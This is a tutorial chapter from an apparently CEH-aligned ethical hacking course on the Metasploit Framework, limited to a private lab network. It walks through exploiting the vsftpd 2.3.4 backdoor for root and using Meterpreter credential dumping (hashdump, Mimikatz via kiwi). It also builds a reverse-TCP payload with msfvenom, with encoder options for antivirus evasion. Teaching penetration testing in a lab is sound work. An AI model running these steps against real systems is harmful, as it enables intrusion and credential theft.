# 09 — The Metasploit Framework

> **What you'll learn:** what Metasploit is, its core building blocks (exploit, payload, encoder, auxiliary, post module, handler), how to drive `msfconsole` with a database behind it, and a full attack — from scanning into the DB, to exploiting Metasploitable2, to a Meterpreter session, to building your own payload with `msfvenom`.
> **Prerequisites:** [08 — Web application hacking](08-web-hacking.md). ⬅️ [Course index](README.md)

This is the chapter where everything from 04–08 pays off: you *found* a weakness, now you *use* it. We map to CEH [Module 06 — System Hacking](../modules/06-system-hacking/). Everything here is **lab only** — Kali `192.168.56.10`, Metasploitable2 `192.168.56.20`.

---

## What is Metasploit?
**Metasploit** is a framework — a big, organized toolbox — for *exploitation*. Instead of writing attack code from scratch for every vulnerability, you pick a ready-made **module**, fill in a few settings (target IP, your IP), and fire. It ships with Kali. The part you'll live in is **`msfconsole`**, an interactive prompt where you search for modules, configure them, and launch them.

Think of it like a very specialized shell: you `use` a module, `set` its options, then `run` it — the same three verbs over and over, whether you're scanning, exploiting, or cleaning up afterward.

## Core concepts — the vocabulary first
Metasploit has a handful of words that beginners mix up. Learn these and the rest is easy:

| Term | Plain meaning |
|---|---|
| **Exploit** | The module that abuses a specific vulnerability to get code running on the target. |
| **Payload** | The code that *runs on the target* once the exploit lands — a shell, or Meterpreter. |
| **Encoder** | Reshuffles a payload's bytes to dodge simple signature-based antivirus/IDS. Not encryption. |
| **Auxiliary** | Modules with **no payload** — scanners, fuzzers, login brute-forcers, DoS. The "recon & poke" drawer. |
| **Post module** | Runs *after* you have a session — loot creds, gather info, pivot, persist. |
| **Listener / handler** | The part *on your Kali* that waits for the target to call back and catches the session. |
| **Session** | A live connection to a compromised host (a shell or Meterpreter) you can interact with. |
| **Encoder/NOPs** | NOPs are padding bytes; you rarely set these by hand. |

### Staged vs. stageless payloads (a classic exam point)
A payload can arrive in one piece or two:

- **Staged** — written with **slashes**: `windows/x64/meterpreter/reverse_tcp`. A tiny first piece (the *stager*) lands, connects back, and pulls down the rest (the *stage*). Smaller initial footprint; needs a solid connection.
- **Stageless / inline** — written with **underscores**: `windows/x64/meterpreter_reverse_tcp`. The whole payload ships at once. Bigger, but more reliable over flaky links.

> Read the naming and you know which is which: **`/` = staged**, **`_` = stageless**. That single character is the whole distinction.

### reverse vs. bind
- **reverse_tcp** — the target connects *back to you*. This is the default because it sails out through most firewalls (outbound is usually allowed).
- **bind_tcp** — the target opens a port and *you* connect *in*. Fails when a firewall blocks inbound — less common.

## Step 1 — Start the database
Metasploit works far better with a **PostgreSQL** database behind it: it remembers every host, service, and credential you find, so you can query them later. Set it up once:

```bash
sudo msfdb init          # create and start the Metasploit database
# You should see: "Creating database user 'msf'... Creating databases..."
```

Now launch the console and confirm the DB is wired in:

```bash
msfconsole -q            # -q = quiet (skip the ASCII banner)
# ...you land at the msf6 > prompt

db_status
# You should see: "Connected to msf. Connection type: postgresql."
```

If it says *not connected*, exit and run `sudo msfdb reinit`, then relaunch.

## Step 2 — msfconsole basics
Everything below is typed at the `msf6 >` prompt.

**Workspaces** keep engagements separate — one target set per workspace, so data doesn't get muddled:

```bash
workspace                # list workspaces (* marks the current one)
workspace -a ceh-lab     # add and switch to a new workspace
```

**Search** for a module by keyword. Filters narrow it fast:

```bash
search vsftpd                         # everything mentioning vsftpd
search type:exploit name:vsftpd       # only exploits, name contains vsftpd
search type:auxiliary smb             # SMB scanners/enumerators
# You should see a numbered table: # Name  Disclosure Date  Rank  Check  Description
```

**Use** a module (by full name, or by the number from the last search), then read and configure it:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
info                     # ALWAYS read this first: what it does, targets, references
show options             # the settings this module needs
```

**Set** options. `set` applies to the current module; **`setg`** ("set global") applies to *every* module this session — handy for values you reuse like `LHOST`:

```bash
setg LHOST 192.168.56.10       # your Kali IP, remembered everywhere
set  RHOSTS 192.168.56.20      # the target (RHOSTS = remote host/s)
```

**Check, then run.** Some modules can *verify* a target is vulnerable without exploiting it:

```bash
check                    # (if supported) "is this actually vulnerable?"
run                      # launch it — 'exploit' is an alias, same thing
```

> The whole rhythm of Metasploit: **`use` → `info` → `show options` → `set` → `check` → `run`**. Memorize that loop and every module feels the same.

## Step 3 — Feed Nmap straight into the database
You *could* scan in a separate terminal, but `db_nmap` runs Nmap and files every result into the workspace automatically. It takes the exact same flags as normal `nmap` (see [05 — Nmap scanning](05-nmap-scanning.md)):

```bash
db_nmap -sV -sC 192.168.56.20        # version + default scripts, results stored
# You should see normal Nmap output, then the msf prompt again

hosts                    # every host the DB knows about
services                 # every open port/service found
services -p 21           # filter to just FTP (port 21)
# You should see 192.168.56.20  21  ftp  vsftpd 2.3.4
```

Now the plan writes itself: **enumerate → pick the exact module → check → run**. The scan says `vsftpd 2.3.4` on port 21 — a version with a famous backdoor. That's our exact module.

## Step 4 — A full worked exploit (Metasploitable2)
`vsftpd 2.3.4` shipped (briefly) with a malicious backdoor: log in with a username ending in `:)` and it opens a root shell on port 6200. Metasploit automates the whole thing.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.56.20
run
# You should see:
#   [+] 192.168.56.20:21 - Backdoor service has been spawned, handling...
#   [+] 192.168.56.20:21 - UID: uid=0(root) gid=0(root)
#   [*] Command shell session 1 opened (192.168.56.10 -> 192.168.56.20:6200)
```

You now have a **command shell session** as `root`. It's a plain shell (no fancy prompt), so confirm who you are with normal Linux commands:

```bash
id                       # uid=0(root) gid=0(root) — you're root
whoami                   # root
hostname                 # metasploitable
```

That's a full compromise from a single scanned version string. This module has no payload of its own to choose — the backdoor *is* the shell — which is why you never set `PAYLOAD` here.

## Step 5 — Managing sessions
A **session** is your live connection to a target. You can hold several at once and jump between them.

```bash
# From inside a shell/session, drop back to msf without killing it:
background               # (Ctrl+Z also works) -> returns to msf6 >

sessions -l              # list all sessions (l = list)
# You should see:  Id  Type          Information            Connection
#                   1   shell cmd/unix  ...                  192.168.56.10 -> ...

sessions -i 1           # interact with session 1 (i = interact)
sessions -k 1           # kill session 1 when done (k = kill)
```

A basic shell is fragile (no job control, dies easily). You can **upgrade** it to Meterpreter — a much richer session — in one step:

```bash
sessions -u 1           # upgrade session 1 to Meterpreter
# You should see a new Meterpreter session open (e.g. session 2)
```

## Step 6 — Meterpreter deep dive
**Meterpreter** is Metasploit's flagship payload: an in-memory agent that runs entirely in RAM (quiet on disk) and gives you a rich command set. The commands below shine on a **Windows** target (the lab's Windows box, or the payload you'll build in Step 7); a few are Windows-only and noted as such.

```bash
# --- Orientation: who and where am I? ---
getuid                   # the account you're running as
sysinfo                  # OS, architecture, hostname, domain
ps                       # running processes with PIDs (for migrate)
getprivs                 # what privileges this token holds
```

```bash
# --- Get more solid, get higher ---
migrate 1234             # move into another process (PID 1234) — survives if the
                         #   original process dies; also changes which user you are
getsystem                # Windows: escalate from admin -> NT AUTHORITY\SYSTEM
hashdump                 # Windows: dump local SAM password hashes (needs SYSTEM)
load kiwi                # load Kiwi (Mimikatz) — creds/tickets from memory
creds_all                #   (after load kiwi) harvest logon credentials
```

```bash
# --- Pivoting & post modules ---
portfwd add -l 3389 -p 3389 -r 192.168.56.20   # forward local:3389 -> target's 3389
                                               #   reach services behind the target
run post/windows/gather/enum_logged_on_users   # a post module, straight from Meterpreter
download C:\\Users\\Public\\notes.txt          # pull a file back to Kali
upload tools/mimikatz.exe C:\\Windows\\Temp\\  # push a file to the target
shell                    # drop to a native OS shell; 'exit' returns to Meterpreter
```

Two habits worth building: after landing, **`migrate`** into a stable process so a crash or logout doesn't drop your session, and only reach for **`getsystem` / `hashdump`** once you actually need SYSTEM — they're loud.

### `local_exploit_suggester` — find your privesc path
When you land as a normal user and need to escalate, don't guess. This post module checks the target against Metasploit's local privilege-escalation exploits and tells you which are likely to work:

```bash
# From inside a Meterpreter session:
run post/multi/recon/local_exploit_suggester
# You should see a list like:
#   [+] exploit/windows/local/... : The target appears to be vulnerable.
```

Then `use` a suggested exploit, `set SESSION <id>`, set its payload, and `run` — the same loop, aimed at privilege escalation.

## Step 7 — Build your own payload with msfvenom
Not every foothold comes from a canned exploit. **`msfvenom`** is Metasploit's payload *factory*: it turns a payload into a standalone file (an `.exe`, `.elf`, script, etc.) that you deliver yourself — then you catch the callback with a **handler**. This is a separate command-line tool, run from the normal shell (not inside msfconsole).

```bash
# Build a Windows 64-bit Meterpreter reverse-TCP executable for the lab:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.10 LPORT=4444 -f exe -o /tmp/lab_payload.exe
# -p = payload   LHOST/LPORT = where it calls back (your Kali)
# -f = output format (exe)    -o = output file
# You should see: "Payload size: ... bytes" and "Saved as: /tmp/lab_payload.exe"
```

Options you'll meet: `-e x86/shikata_ga_nai -i 5` runs an **encoder** 5 times to reshape the bytes; `msfvenom -l payloads` and `msfvenom --list formats` show what's available. (This is a *benign lab* binary — build it only for your own Windows VM, never anything else.)

**Catch it with `multi/handler`.** The handler is just a listener that expects one specific payload — it must match exactly what you built:

```bash
# Back in msfconsole:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # MUST match msfvenom's -p
set LHOST 192.168.56.10
set LPORT 4444
run                      # start listening
# You should see: "[*] Started reverse TCP handler on 192.168.56.10:4444"
```

Now run `lab_payload.exe` on your Windows lab VM. The handler catches the connection and drops you into Meterpreter — the exact same session type as Step 6, ready for `getuid`, `migrate`, and the rest.

## Common beginner mistakes
- **Skipping `show options`.** Half of "the exploit failed" is an unset `RHOSTS` or wrong `LHOST`. Read the options every time.
- **`LHOST` vs `RHOSTS` mix-up.** `RHOSTS` = the *target*; `LHOST` = *your* Kali (where callbacks land). Swapping them is the #1 first-week error.
- **Handler payload doesn't match the venom payload.** If `msfvenom -p` says `x64` and `multi/handler` is set to `x86`, nothing connects. They must be identical.
- **Reaching for exploits before enumerating.** The module you pick comes *from* the scan (`vsftpd 2.3.4` → the vsftpd module). No enumeration, no exact module.
- **Forgetting to `background` a session.** Interacting with a shell, then typing msf commands into it, confuses everyone. `background`, then `sessions -l`.
- **Not running `db_status`.** No database means no `db_nmap`, no `hosts`, no saved loot. Confirm it's connected first.

## ✅ Practice task
1. Run `sudo msfdb init`, launch `msfconsole -q`, and confirm `db_status` shows *connected*. Create a workspace `ceh-lab`.
2. `db_nmap -sV 192.168.56.20`, then list `services -p 21` and confirm it found `vsftpd 2.3.4`.
3. Exploit it with `exploit/unix/ftp/vsftpd_234_backdoor`; in the session run `id` (should be `root`), then `background` and `sessions -l`.
4. Upgrade the shell with `sessions -u <id>` and, in the new Meterpreter, run `sysinfo` and `getuid`.
5. Build a lab payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /tmp/lab_payload.exe`, then set up `multi/handler` to match and confirm it starts listening.

## Next
➡️ [10 — Password attacks](10-password-attacks.md): hydra, hashcat, john, and turning the hashes you just dumped into plaintext.

## Sources
- Metasploit official documentation — https://docs.metasploit.com/
- Kali Tools — Metasploit Framework — https://www.kali.org/tools/metasploit-framework/
- Offensive Security — Metasploit Unleashed (free course) — https://www.offsec.com/metasploit-unleashed/
- Rapid7 — msfvenom reference — https://docs.rapid7.com/metasploit/msfvenom/
- CEH mapping — [Module 06 — System Hacking](../modules/06-system-hacking/)
